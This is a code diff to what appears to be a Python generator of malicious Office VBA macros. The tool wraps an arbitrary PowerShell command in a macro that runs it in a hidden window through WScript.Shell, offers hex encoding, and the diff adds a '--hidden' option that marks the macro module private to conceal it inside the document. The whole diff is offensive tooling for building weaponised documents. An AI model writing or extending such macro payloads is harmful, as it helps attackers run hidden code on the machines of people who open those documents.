@@ -61,16 +61,23 @@ class  Maker_Code:
                 with open ("MacroStore/"+self.args.Name+".txt",'a') as Macro_File :  
                           Micro_write = Macro_File.write("\tDim Str As String\n"+f'{Do}'+\
                                       '\tCreateObject("Wscript.shell").Run Str , 0, True \n'+"End Sub\n")
-                       
+            if self.args.hidden: 
+                Option_Hidden = "Option Explicit"+'\n\n'+"Option Private Module"+'\n\n' 
+                with open ("MacroStore/"+self.args.Name+".txt",'r') as Macro_File : 
+                       Macro_read =  Macro_File.read()        
+                with open ("MacroStore/"+self.args.Name+".txt",'w') as Macro_File : 
+                       Macro_read =  Macro_File.write(Option_Hidden+Macro_read )
+
             with open ("MacroStore/"+self.args.Name+".txt",'r') as Macro_File : 
-                       Macro_read =  Macro_File.read()
+                       Macro_read =  Macro_File.read()           
             print(Macro_read)
        def control(self):    
          parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -n ] [arguments]")       
          parser.add_argument( "-c","--Command",help ="PowerShell Command ") 
          parser.add_argument( "-n","--Name"   ,help ="Name of the Macto output ")  
          parser.add_argument( "-r","--read"   ,help ="read the command from file ")
-         parser.add_argument( "--hex",action='store_true',help ="generate the Macros in  hex format")     
+         parser.add_argument( "--hex",action='store_true',help ="generate the Macros in  hex format")   
+         parser.add_argument( "-H","--hidden",action='store_true',help ="hidden Macros in the Document you will cteate")    
          self.args = parser.parse_args()        
          if len(sys.argv)!=1 :
             pass
